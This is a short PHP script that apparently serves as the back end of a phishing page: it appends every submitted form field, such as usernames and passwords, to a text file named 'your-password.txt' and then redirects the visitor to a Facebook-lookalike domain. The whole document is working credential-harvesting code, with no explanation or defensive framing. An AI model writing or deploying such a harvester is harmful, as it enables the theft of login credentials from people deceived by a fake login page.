<?php
$file = fopen("your-password.txt", "a");
fwrite($file, "t\t\t\t\t\t");
fwrite($file, "\r\n");
foreach($_POST as $key=>$value) {
    fwrite($file, "\t\t\t\t\t\t");
    fwrite($file, $key);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
fwrite($file, "\r\n");
fwrite($file, "\t\t\t\t\t\t");
fclose($file);
header("Location:  http://facedbo0k.mysite.web.za/");
die();
?>
